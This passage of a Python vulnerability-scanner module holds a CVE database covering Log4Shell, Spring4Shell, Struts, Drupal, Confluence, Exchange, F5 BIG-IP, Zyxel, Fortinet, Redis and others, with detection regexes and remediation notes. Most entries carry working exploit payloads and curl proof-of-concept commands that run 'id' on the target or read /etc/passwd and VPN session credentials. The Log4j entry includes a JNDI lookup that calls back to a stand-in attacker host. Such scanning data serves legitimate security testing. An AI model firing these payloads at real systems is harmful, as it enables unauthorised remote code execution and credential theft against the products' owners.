#!/usr/bin/env python3
"""
CVE Database and Vulnerability Signatures Module
Comprehensive database of known CVEs with detection patterns and exploit information
Inspired by Nuclei templates and NVD database
"""

from dataclasses import dataclass, field
from typing import List, Dict, Optional, Callable
from enum import Enum
import re


class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"


class VulnCategory(Enum):
    XSS = "Cross-Site Scripting"
    SQLI = "SQL Injection"
    RCE = "Remote Code Execution"
    LFI = "Local File Inclusion"
    RFI = "Remote File Inclusion"
    SSRF = "Server-Side Request Forgery"
    XXE = "XML External Entity"
    IDOR = "Insecure Direct Object Reference"
    AUTH_BYPASS = "Authentication Bypass"
    INFO_DISCLOSURE = "Information Disclosure"
    MISCONFIG = "Security Misconfiguration"
    SUBDOMAIN_TAKEOVER = "Subdomain Takeover"
    OPEN_REDIRECT = "Open Redirect"
    CORS = "CORS Misconfiguration"
    CSRF = "Cross-Site Request Forgery"
    SSTI = "Server-Side Template Injection"
    DESERIALIZATION = "Insecure Deserialization"
    PATH_TRAVERSAL = "Path Traversal"
    COMMAND_INJECTION = "Command Injection"
    HEADER_INJECTION = "Header Injection"


@dataclass
class CVEEntry:
    """Represents a CVE entry with detection and exploitation info"""
    cve_id: str
    title: str
    description: str
    severity: Severity
    category: VulnCategory
    cvss_score: float
    affected_products: List[str]
    detection_patterns: List[str]  # Regex patterns for detection
    http_paths: List[str] = field(default_factory=list)  # Paths to check
    http_methods: List[str] = field(default_factory=lambda: ["GET"])
    headers: Dict[str, str] = field(default_factory=dict)
    payloads: List[str] = field(default_factory=list)
    response_patterns: List[str] = field(default_factory=list)  # Patterns indicating vulnerability
    poc_commands: List[str] = field(default_factory=list)
    exploit_available: bool = False
    references: List[str] = field(default_factory=list)
    remediation: str = ""
    tags: List[str] = field(default_factory=list)


# Comprehensive CVE Database
CVE_DATABASE: List[CVEEntry] = [
    # Apache Log4j (Log4Shell)
    CVEEntry(
        cve_id="CVE-2021-44228",
        title="Apache Log4j Remote Code Execution (Log4Shell)",
        description="Apache Log4j2 JNDI features do not protect against attacker-controlled LDAP and other JNDI related endpoints",
        severity=Severity.CRITICAL,
        category=VulnCategory.RCE,
        cvss_score=10.0,
        affected_products=["Apache Log4j 2.0-beta9 to 2.14.1"],
        detection_patterns=[r"log4j", r"Log4j2", r"apache.*log4j"],
        http_paths=["/", "/api", "/login", "/search"],
        payloads=[
            "${jndi:ldap://CALLBACK_HOST/a}",
            "${${lower:j}${lower:n}${lower:d}i:${lower:l}${lower:d}a${lower:p}://CALLBACK_HOST/a}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://CALLBACK_HOST/a}",
        ],
        response_patterns=[],
        poc_commands=[
            "# Use Burp Collaborator or interactsh to detect callback",
            "curl -H 'X-Api-Version: ${jndi:ldap://ATTACKER.com/a}' TARGET_URL",
            "curl -H 'User-Agent: ${jndi:ldap://ATTACKER.com/a}' TARGET_URL",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"],
        remediation="Upgrade to Log4j 2.17.0 or later",
        tags=["log4j", "jndi", "rce", "critical"]
    ),

    # Spring4Shell
    CVEEntry(
        cve_id="CVE-2022-22965",
        title="Spring Framework RCE (Spring4Shell)",
        description="Spring Framework RCE via Data Binding on JDK 9+",
        severity=Severity.CRITICAL,
        category=VulnCategory.RCE,
        cvss_score=9.8,
        affected_products=["Spring Framework < 5.3.18", "Spring Framework < 5.2.20"],
        detection_patterns=[r"spring", r"springframework", r"\.jsp", r"tomcat"],
        http_paths=["/"],
        http_methods=["GET", "POST"],
        payloads=[
            "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
        ],
        response_patterns=[r"tomcat", r"\.jsp"],
        poc_commands=[
            "# Check if target uses Spring with Tomcat on JDK 9+",
            "curl 'TARGET_URL?class.module.classLoader.URLs%5B0%5D=0'",
            "# If 400 error with Spring trace, may be vulnerable",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2022-22965"],
        remediation="Upgrade Spring Framework to 5.3.18+ or 5.2.20+",
        tags=["spring", "rce", "critical", "java"]
    ),

    # Apache Struts RCE
    CVEEntry(
        cve_id="CVE-2017-5638",
        title="Apache Struts2 Remote Code Execution",
        description="RCE via Content-Type header in Jakarta Multipart parser",
        severity=Severity.CRITICAL,
        category=VulnCategory.RCE,
        cvss_score=10.0,
        affected_products=["Apache Struts 2.3.x before 2.3.32", "Apache Struts 2.5.x before 2.5.10.1"],
        detection_patterns=[r"struts", r"\.action", r"\.do"],
        http_paths=["/*.action", "/*.do", "/struts2-showcase/"],
        headers={"Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd','/c',#cmd}:{'/bin/sh','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"},
        payloads=[],
        response_patterns=[r"uid=\d+", r"root:"],
        poc_commands=[
            "# Send malicious Content-Type header",
            "curl -H \"Content-Type: %{...OGNL_PAYLOAD...}\" TARGET_URL/struts2-showcase/",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2017-5638"],
        remediation="Upgrade to Struts 2.3.32 or 2.5.10.1",
        tags=["struts", "ognl", "rce", "critical"]
    ),

    # WordPress XML-RPC Pingback
    CVEEntry(
        cve_id="CVE-2013-0235",
        title="WordPress XML-RPC Pingback SSRF/DDoS",
        description="WordPress pingback feature can be abused for SSRF and DDoS amplification",
        severity=Severity.MEDIUM,
        category=VulnCategory.SSRF,
        cvss_score=5.0,
        affected_products=["WordPress < 3.5.1"],
        detection_patterns=[r"wordpress", r"wp-content", r"wp-includes"],
        http_paths=["/xmlrpc.php"],
        http_methods=["POST"],
        payloads=[
            '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>CALLBACK_URL</string></value></param><param><value><string>TARGET_POST_URL</string></value></param></params></methodCall>',
        ],
        response_patterns=[r"<methodResponse>", r"faultCode"],
        poc_commands=[
            "curl -X POST TARGET_URL/xmlrpc.php -d '<?xml version=\"1.0\"?><methodCall><methodName>system.listMethods</methodName></methodCall>'",
            "# Check if pingback.ping method is available",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2013-0235"],
        remediation="Disable XML-RPC or use security plugins",
        tags=["wordpress", "xmlrpc", "ssrf", "ddos"]
    ),

    # Drupal Drupalgeddon2
    CVEEntry(
        cve_id="CVE-2018-7600",
        title="Drupal Remote Code Execution (Drupalgeddon2)",
        description="RCE via Form API AJAX requests in Drupal",
        severity=Severity.CRITICAL,
        category=VulnCategory.RCE,
        cvss_score=9.8,
        affected_products=["Drupal 7.x < 7.58", "Drupal 8.x < 8.3.9", "Drupal 8.4.x < 8.4.6", "Drupal 8.5.x < 8.5.1"],
        detection_patterns=[r"drupal", r"sites/default", r"Drupal\.settings"],
        http_paths=["/user/register", "/user/password", "/"],
        http_methods=["POST"],
        payloads=[
            "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id",
        ],
        response_patterns=[r"uid=", r"gid="],
        poc_commands=[
            "curl -X POST 'TARGET_URL/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' --data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=passthru&mail[#type]=markup&mail[#markup]=id'",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2018-7600"],
        remediation="Update Drupal to latest patched version",
        tags=["drupal", "rce", "critical"]
    ),

    # Apache HTTP Server Path Traversal
    CVEEntry(
        cve_id="CVE-2021-41773",
        title="Apache HTTP Server Path Traversal",
        description="Path traversal and file disclosure vulnerability in Apache 2.4.49",
        severity=Severity.HIGH,
        category=VulnCategory.PATH_TRAVERSAL,
        cvss_score=7.5,
        affected_products=["Apache HTTP Server 2.4.49"],
        detection_patterns=[r"Apache/2\.4\.49", r"Server:.*Apache"],
        http_paths=[
            "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        ],
        response_patterns=[r"root:.*:0:0:", r"/bin/bash", r"/bin/sh"],
        poc_commands=[
            "curl 'TARGET_URL/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'",
            "curl 'TARGET_URL/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-41773"],
        remediation="Upgrade to Apache 2.4.51 or later",
        tags=["apache", "path-traversal", "lfi"]
    ),

    # Apache HTTP Server RCE
    CVEEntry(
        cve_id="CVE-2021-42013",
        title="Apache HTTP Server RCE via Path Traversal",
        description="RCE via path traversal in Apache 2.4.49 and 2.4.50 with mod_cgi enabled",
        severity=Severity.CRITICAL,
        category=VulnCategory.RCE,
        cvss_score=9.8,
        affected_products=["Apache HTTP Server 2.4.49", "Apache HTTP Server 2.4.50"],
        detection_patterns=[r"Apache/2\.4\.(49|50)", r"Server:.*Apache"],
        http_paths=[
            "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh",
        ],
        http_methods=["POST"],
        payloads=["echo;id"],
        response_patterns=[r"uid=", r"gid="],
        poc_commands=[
            "curl -X POST 'TARGET_URL/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh' -d 'echo Content-Type: text/plain; echo; id'",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-42013"],
        remediation="Upgrade to Apache 2.4.51 or later",
        tags=["apache", "rce", "critical", "cgi"]
    ),

    # Nginx Buffer Overflow
    CVEEntry(
        cve_id="CVE-2021-23017",
        title="Nginx DNS Resolver Off-by-One Heap Write",
        description="1-byte memory overwrite in resolver leading to crash or potential RCE",
        severity=Severity.HIGH,
        category=VulnCategory.RCE,
        cvss_score=7.7,
        affected_products=["Nginx 0.6.18 - 1.20.0"],
        detection_patterns=[r"nginx/[01]\.[0-9]+\.[0-9]+", r"Server:.*nginx"],
        http_paths=["/"],
        response_patterns=[],
        poc_commands=[
            "# Requires control over DNS responses to target's resolver",
            "# Craft DNS response with specific length to trigger overflow",
        ],
        exploit_available=False,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-23017"],
        remediation="Upgrade Nginx to 1.20.1 or later",
        tags=["nginx", "buffer-overflow", "dns"]
    ),

    # ProxyShell (Exchange)
    CVEEntry(
        cve_id="CVE-2021-34473",
        title="Microsoft Exchange Server ProxyShell RCE",
        description="Pre-auth RCE chain in Microsoft Exchange Server",
        severity=Severity.CRITICAL,
        category=VulnCategory.RCE,
        cvss_score=9.8,
        affected_products=["Microsoft Exchange Server 2013", "Microsoft Exchange Server 2016", "Microsoft Exchange Server 2019"],
        detection_patterns=[r"Microsoft-IIS", r"X-OWA-Version", r"X-FEServer"],
        http_paths=[
            "/autodiscover/autodiscover.json?@zdi/PowerShell",
            "/autodiscover/autodiscover.json?a]@foo.com/ews/exchange.asmx?a]",
            "/mapi/nspi/",
        ],
        response_patterns=[r"Microsoft-IIS", r"Exchange", r"X-OWA-Version"],
        poc_commands=[
            "curl -k 'TARGET_URL/autodiscover/autodiscover.json?@zdi/PowerShell'",
            "# Check for Exchange server headers and autodiscover endpoint",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-34473"],
        remediation="Apply Microsoft security updates KB5001779 and later",
        tags=["exchange", "proxyshell", "rce", "critical"]
    ),

    # ProxyLogon (Exchange)
    CVEEntry(
        cve_id="CVE-2021-26855",
        title="Microsoft Exchange Server ProxyLogon SSRF",
        description="SSRF vulnerability allowing authentication bypass in Exchange Server",
        severity=Severity.CRITICAL,
        category=VulnCategory.SSRF,
        cvss_score=9.8,
        affected_products=["Microsoft Exchange Server 2013", "Microsoft Exchange Server 2016", "Microsoft Exchange Server 2019"],
        detection_patterns=[r"Microsoft-IIS", r"X-OWA-Version", r"X-FEServer"],
        http_paths=["/owa/auth/logon.aspx", "/ecp/", "/ews/"],
        headers={"Cookie": "X-BEResource=localhost~1942062522"},
        response_patterns=[r"Microsoft-IIS", r"Exchange"],
        poc_commands=[
            "curl -k 'TARGET_URL/ecp/y]js<script>' -H 'Cookie: X-BEResource=localhost~1942062522'",
            "# Check X-FEServer and X-BEServer headers in response",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-26855"],
        remediation="Apply Microsoft emergency patches",
        tags=["exchange", "proxylogon", "ssrf", "critical"]
    ),

    # GitLab RCE
    CVEEntry(
        cve_id="CVE-2021-22205",
        title="GitLab CE/EE RCE via Image Processing",
        description="Unauthenticated RCE via malicious image upload in GitLab",
        severity=Severity.CRITICAL,
        category=VulnCategory.RCE,
        cvss_score=10.0,
        affected_products=["GitLab CE/EE 11.9 - 13.10.2"],
        detection_patterns=[r"gitlab", r"GitLab"],
        http_paths=["/users/sign_in", "/uploads/user", "/api/v4/"],
        response_patterns=[r"gitlab", r"GitLab"],
        poc_commands=[
            "# Craft malicious DjVu image with embedded commands",
            "# Upload via /uploads/user endpoint without authentication",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-22205"],
        remediation="Update GitLab to 13.10.3 or later",
        tags=["gitlab", "rce", "critical", "image-upload"]
    ),

    # Atlassian Confluence OGNL Injection
    CVEEntry(
        cve_id="CVE-2022-26134",
        title="Atlassian Confluence OGNL Injection RCE",
        description="Unauthenticated RCE via OGNL injection in Confluence Server",
        severity=Severity.CRITICAL,
        category=VulnCategory.RCE,
        cvss_score=9.8,
        affected_products=["Confluence Server < 7.4.17", "Confluence Server < 7.13.7", "Confluence Server < 7.14.3", "Confluence Server < 7.15.2", "Confluence Server < 7.16.4", "Confluence Server < 7.17.4", "Confluence Server < 7.18.1"],
        detection_patterns=[r"confluence", r"Atlassian Confluence"],
        http_paths=["/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream(),'utf-8')).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader('X-Cmd-Response',#a))}/"],
        response_patterns=[r"X-Cmd-Response:.*uid="],
        poc_commands=[
            "curl -v 'TARGET_URL/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%2C%27utf-8%27%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%27X-Cmd-Response%27%2C%23a%29%29%7D/'",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2022-26134"],
        remediation="Update Confluence to patched version",
        tags=["confluence", "atlassian", "ognl", "rce", "critical"]
    ),

    # VMware vCenter Server RCE
    CVEEntry(
        cve_id="CVE-2021-21985",
        title="VMware vCenter Server RCE",
        description="RCE via Virtual SAN Health Check plugin in vCenter Server",
        severity=Severity.CRITICAL,
        category=VulnCategory.RCE,
        cvss_score=9.8,
        affected_products=["VMware vCenter Server 6.5", "VMware vCenter Server 6.7", "VMware vCenter Server 7.0"],
        detection_patterns=[r"vmware", r"vcenter", r"vsphere"],
        http_paths=["/ui/h5-vsan/rest/proxy/service/vsanQueryUtil"],
        response_patterns=[r"vcenter", r"vmware", r"vsphere"],
        poc_commands=[
            "curl -k 'TARGET_URL/ui/h5-vsan/rest/proxy/service/vsanQueryUtil'",
            "# Check if vSAN Health Check plugin is accessible",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-21985"],
        remediation="Update vCenter Server or disable vSAN Health Check plugin",
        tags=["vmware", "vcenter", "rce", "critical"]
    ),

    # Grafana Path Traversal
    CVEEntry(
        cve_id="CVE-2021-43798",
        title="Grafana Directory Traversal",
        description="Arbitrary file read via plugin path traversal in Grafana",
        severity=Severity.HIGH,
        category=VulnCategory.PATH_TRAVERSAL,
        cvss_score=7.5,
        affected_products=["Grafana 8.0.0-beta1 to 8.3.0"],
        detection_patterns=[r"grafana", r"Grafana"],
        http_paths=[
            "/public/plugins/alertlist/../../../../../../../../etc/passwd",
            "/public/plugins/graph/../../../../../../../../etc/passwd",
            "/public/plugins/prometheus/../../../../../../../../etc/passwd",
        ],
        response_patterns=[r"root:.*:0:0:", r"/bin/bash"],
        poc_commands=[
            "curl 'TARGET_URL/public/plugins/alertlist/../../../../../../../../etc/passwd'",
            "curl 'TARGET_URL/public/plugins/graph/../../../../../../../etc/grafana/grafana.ini'",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-43798"],
        remediation="Upgrade Grafana to 8.3.1 or later",
        tags=["grafana", "path-traversal", "lfi"]
    ),

    # F5 BIG-IP RCE
    CVEEntry(
        cve_id="CVE-2022-1388",
        title="F5 BIG-IP iControl REST RCE",
        description="Unauthenticated RCE via iControl REST API in F5 BIG-IP",
        severity=Severity.CRITICAL,
        category=VulnCategory.RCE,
        cvss_score=9.8,
        affected_products=["F5 BIG-IP 16.1.0 - 16.1.2", "F5 BIG-IP 15.1.0 - 15.1.5", "F5 BIG-IP 14.1.0 - 14.1.4", "F5 BIG-IP 13.1.0 - 13.1.4", "F5 BIG-IP 12.1.0 - 12.1.6", "F5 BIG-IP 11.6.1 - 11.6.5"],
        detection_patterns=[r"BIG-IP", r"F5", r"tmui"],
        http_paths=["/mgmt/tm/util/bash"],
        http_methods=["POST"],
        headers={
            "Connection": "keep-alive, X-F5-Auth-Token",
            "X-F5-Auth-Token": "0",
            "Authorization": "Basic YWRtaW46"
        },
        payloads=['{"command":"run","utilCmdArgs":"-c id"}'],
        response_patterns=[r"uid=", r"commandResult"],
        poc_commands=[
            "curl -sk 'TARGET_URL/mgmt/tm/util/bash' -H 'Connection: keep-alive, X-F5-Auth-Token' -H 'X-F5-Auth-Token: 0' -H 'Authorization: Basic YWRtaW46' -d '{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}'",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2022-1388"],
        remediation="Apply F5 security hotfix or upgrade BIG-IP",
        tags=["f5", "bigip", "rce", "critical"]
    ),

    # Zyxel Firewall RCE
    CVEEntry(
        cve_id="CVE-2022-30525",
        title="Zyxel Firewall OS Command Injection",
        description="Unauthenticated RCE via command injection in Zyxel firewalls",
        severity=Severity.CRITICAL,
        category=VulnCategory.COMMAND_INJECTION,
        cvss_score=9.8,
        affected_products=["Zyxel USG FLEX", "Zyxel ATP", "Zyxel VPN", "Zyxel NSG"],
        detection_patterns=[r"zyxel", r"Zyxel", r"ZyWALL"],
        http_paths=["/ztp/cgi-bin/handler"],
        http_methods=["POST"],
        payloads=['{"command":"setWanPortSt","proto":"dhcp","port":"4","vlan_tagged":"1","vlanid":"5","mtu":"; id;","data":"hi"}'],
        response_patterns=[r"uid="],
        poc_commands=[
            "curl -X POST 'TARGET_URL/ztp/cgi-bin/handler' -H 'Content-Type: application/json' -d '{\"command\":\"setWanPortSt\",\"proto\":\"dhcp\",\"port\":\"4\",\"vlan_tagged\":\"1\",\"vlanid\":\"5\",\"mtu\":\"; id;\",\"data\":\"hi\"}'",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2022-30525"],
        remediation="Apply Zyxel firmware updates",
        tags=["zyxel", "firewall", "command-injection", "rce", "critical"]
    ),

    # Fortinet FortiOS SSL VPN
    CVEEntry(
        cve_id="CVE-2018-13379",
        title="Fortinet FortiOS SSL VPN Path Traversal",
        description="Path traversal allowing reading of system files including credentials",
        severity=Severity.CRITICAL,
        category=VulnCategory.PATH_TRAVERSAL,
        cvss_score=9.8,
        affected_products=["FortiOS 5.6.3 - 5.6.7", "FortiOS 6.0.0 - 6.0.4"],
        detection_patterns=[r"fortinet", r"FortiOS", r"fortigate"],
        http_paths=[
            "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
        ],
        response_patterns=[r"var fgt_lang", r"vpn_user", r"portal"],
        poc_commands=[
            "curl 'TARGET_URL/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'",
            "# Response will contain VPN session credentials if vulnerable",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2018-13379"],
        remediation="Upgrade FortiOS to patched version",
        tags=["fortinet", "fortigate", "path-traversal", "vpn", "critical"]
    ),

    # Pulse Secure VPN
    CVEEntry(
        cve_id="CVE-2019-11510",
        title="Pulse Secure VPN Arbitrary File Read",
        description="Pre-auth arbitrary file reading in Pulse Connect Secure",
        severity=Severity.CRITICAL,
        category=VulnCategory.PATH_TRAVERSAL,
        cvss_score=10.0,
        affected_products=["Pulse Connect Secure < 8.2R12.1", "Pulse Connect Secure < 8.3R7.1", "Pulse Connect Secure < 9.0R3.4"],
        detection_patterns=[r"Pulse Secure", r"pulse", r"dana-na"],
        http_paths=[
            "/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/",
        ],
        response_patterns=[r"root:.*:0:0:", r"/bin/bash"],
        poc_commands=[
            "curl 'TARGET_URL/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/'",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2019-11510"],
        remediation="Update Pulse Connect Secure to patched version",
        tags=["pulse", "vpn", "path-traversal", "critical"]
    ),

    # Citrix ADC (NetScaler) Path Traversal
    CVEEntry(
        cve_id="CVE-2019-19781",
        title="Citrix ADC/Gateway Directory Traversal RCE",
        description="Arbitrary code execution via directory traversal in Citrix ADC and Gateway",
        severity=Severity.CRITICAL,
        category=VulnCategory.RCE,
        cvss_score=9.8,
        affected_products=["Citrix ADC and Gateway 10.5", "Citrix ADC and Gateway 11.1", "Citrix ADC and Gateway 12.0", "Citrix ADC and Gateway 12.1", "Citrix ADC and Gateway 13.0"],
        detection_patterns=[r"citrix", r"netscaler", r"Citrix-TransactionId"],
        http_paths=["/vpn/../vpns/cfg/smb.conf"],
        response_patterns=[r"\[global\]", r"smb.conf"],
        poc_commands=[
            "curl 'TARGET_URL/vpn/../vpns/cfg/smb.conf'",
            "# If file is returned, system is vulnerable to RCE",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2019-19781"],
        remediation="Apply Citrix security updates",
        tags=["citrix", "netscaler", "path-traversal", "rce", "critical"]
    ),

    # SolarWinds Orion (SUNBURST)
    CVEEntry(
        cve_id="CVE-2020-10148",
        title="SolarWinds Orion API Authentication Bypass",
        description="Authentication bypass in SolarWinds Orion Platform",
        severity=Severity.CRITICAL,
        category=VulnCategory.AUTH_BYPASS,
        cvss_score=9.8,
        affected_products=["SolarWinds Orion Platform < 2020.2.4"],
        detection_patterns=[r"SolarWinds", r"Orion"],
        http_paths=["/Orion/WebResource.axd", "/Orion/Login.aspx"],
        response_patterns=[r"SolarWinds", r"Orion"],
        poc_commands=[
            "# Check for SolarWinds Orion presence",
            "curl 'TARGET_URL/Orion/Login.aspx'",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2020-10148"],
        remediation="Update SolarWinds Orion Platform",
        tags=["solarwinds", "orion", "auth-bypass", "sunburst"]
    ),

    # Jenkins Script Console
    CVEEntry(
        cve_id="CVE-2019-1003000",
        title="Jenkins Script Console RCE",
        description="Sandbox bypass in Jenkins Pipeline leads to RCE",
        severity=Severity.CRITICAL,
        category=VulnCategory.RCE,
        cvss_score=9.8,
        affected_products=["Jenkins < 2.154", "Jenkins LTS < 2.150.2"],
        detection_patterns=[r"jenkins", r"Jenkins", r"X-Jenkins"],
        http_paths=["/script", "/scriptText", "/computer/(master)/script"],
        response_patterns=[r"Jenkins", r"Groovy script"],
        poc_commands=[
            "curl 'TARGET_URL/script' -d 'script=println \"id\".execute().text'",
            "# Requires authentication unless misconfigured",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2019-1003000"],
        remediation="Update Jenkins and enable authentication",
        tags=["jenkins", "rce", "groovy"]
    ),

    # PHPUnit RCE
    CVEEntry(
        cve_id="CVE-2017-9841",
        title="PHPUnit Remote Code Execution",
        description="RCE through exposed eval-stdin.php in PHPUnit",
        severity=Severity.CRITICAL,
        category=VulnCategory.RCE,
        cvss_score=9.8,
        affected_products=["PHPUnit < 4.8.28", "PHPUnit < 5.6.3"],
        detection_patterns=[r"phpunit", r"PHPUnit"],
        http_paths=[
            "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
            "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        ],
        http_methods=["POST"],
        payloads=["<?php echo(md5('phpunit_rce_test')); ?>"],
        response_patterns=[r"[a-f0-9]{32}"],
        poc_commands=[
            "curl -X POST 'TARGET_URL/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' -d \"<?php echo md5('test'); ?>\"",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2017-9841"],
        remediation="Update PHPUnit or remove eval-stdin.php",
        tags=["php", "phpunit", "rce"]
    ),

    # Elasticsearch RCE
    CVEEntry(
        cve_id="CVE-2015-1427",
        title="Elasticsearch Groovy Sandbox Bypass RCE",
        description="RCE via Groovy script in Elasticsearch",
        severity=Severity.CRITICAL,
        category=VulnCategory.RCE,
        cvss_score=9.8,
        affected_products=["Elasticsearch < 1.3.8", "Elasticsearch < 1.4.3"],
        detection_patterns=[r"elasticsearch", r"Elasticsearch", r":9200"],
        http_paths=["/_search"],
        http_methods=["POST"],
        payloads=[
            '{"size":1,"script_fields":{"test":{"script":"java.lang.Math.class.forName(\\"java.lang.Runtime\\").getRuntime().exec(\\"id\\").getText()"}}}',
        ],
        response_patterns=[r"uid=", r"gid="],
        poc_commands=[
            "curl -X POST 'TARGET_URL/_search' -H 'Content-Type: application/json' -d '{\"size\":1,\"script_fields\":{\"test\":{\"script\":\"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"id\\\").getText()\"}}}'",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2015-1427"],
        remediation="Update Elasticsearch and disable dynamic scripting",
        tags=["elasticsearch", "rce", "groovy"]
    ),

    # Redis Unauthorized Access
    CVEEntry(
        cve_id="CVE-2022-0543",
        title="Redis Lua Sandbox Escape RCE",
        description="Lua sandbox escape leading to RCE in Redis",
        severity=Severity.CRITICAL,
        category=VulnCategory.RCE,
        cvss_score=10.0,
        affected_products=["Redis (Debian-specific packages)"],
        detection_patterns=[r"redis", r":6379"],
        http_paths=[],
        poc_commands=[
            "redis-cli -h TARGET_HOST EVAL 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res' 0",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2022-0543"],
        remediation="Update Redis and configure authentication",
        tags=["redis", "rce", "lua"]
    ),

    # MongoDB Unauthorized Access
    CVEEntry(
        cve_id="CVE-2020-7921",
        title="MongoDB Server-Side JavaScript Injection",
        description="Server-side JavaScript injection through $where clause",
        severity=Severity.HIGH,
        category=VulnCategory.RCE,
        cvss_score=8.1,
        affected_products=["MongoDB < 4.2.3"],
        detection_patterns=[r"mongodb", r":27017"],
        http_paths=[],
        poc_commands=[
            "mongo TARGET_HOST:27017/admin --eval 'db.runCommand({serverStatus:1})'",
            "# Check for open MongoDB without authentication",
        ],
        exploit_available=True,
        references=["https://nvd.nist.gov/vuln/detail/CVE-2020-7921"],
        remediation="Enable authentication and update MongoDB",
        tags=["mongodb", "nosql", "injection"]
    ),

    # Jira Server-Side Template Injection
    CVEEntry(
        cve_id="CVE-2019-11581",
        title="Atlassian Jira Server-Side Template Injection",
        description="SSTI in Jira contact administrators form",
        severity=Severity.CRITICAL,
        category=VulnCategory.SSTI,
        cvss_score=9.8,
        affected_products=["Jira Server and Data Center < 7.6.14", "Jira < 7.13.5", "Jira < 8.0.3", "Jira < 8.1.2", "Jira < 8.2.3"],
